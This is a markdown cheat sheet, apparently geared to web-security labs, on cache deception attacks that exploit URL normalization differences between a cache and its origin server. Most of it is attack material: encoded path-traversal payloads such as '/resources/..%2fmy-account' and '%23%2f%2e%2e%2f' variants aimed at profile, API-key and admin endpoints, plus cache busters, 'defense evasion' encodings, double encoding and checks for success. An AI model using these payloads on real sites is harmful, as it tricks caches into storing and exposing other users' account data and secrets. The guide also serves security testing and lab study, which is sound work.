# Cache Deception — Normalization Discrepancies

## When this applies

- Cache or origin (but not both) decodes URL-encoded characters and resolves `..` segments.
- Origin normalization: Cache caches `/static/...` but origin resolves to `/my-account`.
- Cache normalization: Origin parses `%23` literally; cache decodes and resolves to a static path.

## Technique

Use `..%2f` to traverse: Cache sees `/resources/...` (cacheable), origin sees `/my-account` (sensitive). Or use `%23%2f%2e%2e%2f` to make cache resolve `/my-account#/../resources` to `/resources` while origin treats `%23` literally.

## Steps

### Origin server normalization

Origin decodes `%2f` and resolves `..`; cache treats literally.

**Test:**
```http
GET /resources/..%2fmy-account HTTP/1.1
```

**Exploit:**
```
/static/..%2fprofile
/assets/..%2fapi/keys
/public/..%2fadmin/data
```

**Pattern:**
```
Original:  /my-account
Exploit:   /resources/..%2fmy-account
Result:    Cache matches /resources, origin resolves to /my-account
```

### Cache server normalization

Cache decodes and normalizes; origin doesn't.

**Test:**
```http
GET /my-account%23%2f%2e%2e%2fresources HTTP/1.1
```

**Exploit:**
```
/profile%23%2f%2e%2e%2fstatic?id=1
/api/user%23%2f%2e%2e%2fassets?data=true
```

**Pattern:**
```
Original:  /my-account
Exploit:   /my-account%23%2f%2e%2e%2fresources
Result:    Origin stops at %23, cache normalizes to /resources
```

### Test normalization (both directions)

```http
GET /aaa/..%2fmy-account HTTP/1.1
GET /resources/..%2fmy-account HTTP/1.1
```

### Defense evasion

**Cache busters:**
```
?unique=12345
?timestamp=1234567890
?victim=carlos
?session=abc123
```

**Alternative encoding:**
```
%2f    # /
%2e    # .
%23    # #
%3b    # ;
%3f    # ?
```

**Double encoding:**
```
%252f  # Double-encoded /
%2523  # Double-encoded #
```

## Verifying success

- Request returns the SENSITIVE endpoint's content (matching what `/my-account` would).
- Cache hit on subsequent identical requests.
- The cache key is recognizable as a "static" path even though origin resolved it dynamically.

## Common pitfalls

- Some browsers strip `..` themselves before sending — must originate from a controlled tool (curl, Burp).
- Some caches refuse double-encoded paths — try single encoding first.
- The exact sequence of decode/normalize varies by cache vendor (Cloudflare vs Varnish vs Akamai) — test each.

## Tools

- Burp Suite Repeater
- Burp Decoder (URL-encoding)
- Burp Web Cache Deception Scanner BApp
- curl
